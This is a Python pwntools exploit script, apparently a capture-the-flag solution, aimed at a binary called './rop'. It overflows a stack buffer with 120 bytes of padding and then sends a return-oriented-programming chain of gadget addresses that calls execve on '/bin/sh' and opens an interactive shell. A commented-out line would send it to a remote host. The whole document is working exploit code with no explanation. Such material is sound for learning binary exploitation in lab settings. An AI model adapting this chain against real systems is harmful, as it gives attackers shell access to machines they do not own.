#!/usr/bin/env python
from pwn import *

elf = context.binary = ELF('./rop', checksec=False)
io = process()
# io = remote('host', port)

binsh = 0x4925c7
SYSCALL = 0x474ef5     # 0x0000000000474ef5: syscall; ret; 
POP_RAX = 0x415724     # 0x0000000000415724: pop rax; ret; 
POP_RDI = 0x400686     # 0x0000000000400686: pop rdi; ret; 
POP_RSI = 0x410103     # 0x0000000000410103: pop rsi; ret;
POP_RDX = 0x44bea6     # 0x000000000044bea6: pop rdx; ret; 

# execve syscall 
	# RAX:    0x3b
	# RDI:    pointer to /bin/sh
	# RSI:    0x0
	# RDX:    0x0

offset = 120
payload = flat(
	b'A' * offset,
	POP_RAX,
	0x3b,
	POP_RDI,
	binsh,
	POP_RSI,
	0x0,
	POP_RDX,
	0x0,
	SYSCALL
)

io.sendline(payload)
io.interactive()
